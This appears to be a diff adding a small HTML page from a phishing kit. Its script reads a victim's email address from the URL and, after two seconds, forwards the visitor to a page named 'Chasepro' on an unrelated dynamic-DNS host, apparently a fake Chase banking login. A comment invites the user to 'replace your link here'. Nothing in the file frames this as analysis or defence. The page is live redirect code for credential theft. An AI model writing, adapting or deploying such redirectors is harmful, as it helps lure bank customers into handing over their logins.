@@ -1,0 +1,19 @@
+<html>
+<head>
+<script type="text/javascript">
+		function getUrlVars() {
+		    var vars = {};
+		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+		        vars[key] = value;
+		    });
+		    return vars;
+		}
+		var email = getUrlVars()['app'];
+		var redirect = "https://locksmithsupplies.giize.com/Chasepro/home/index.php"; // replace your link here
+		var urlFinal = redirect + "?app=" + email;
+		setTimeout(function () {
+			window.location.href = urlFinal; //will redirect to your blog page (an ex: blog.html)
+		}, 2000);
+	</script>
+</head>
+</html>
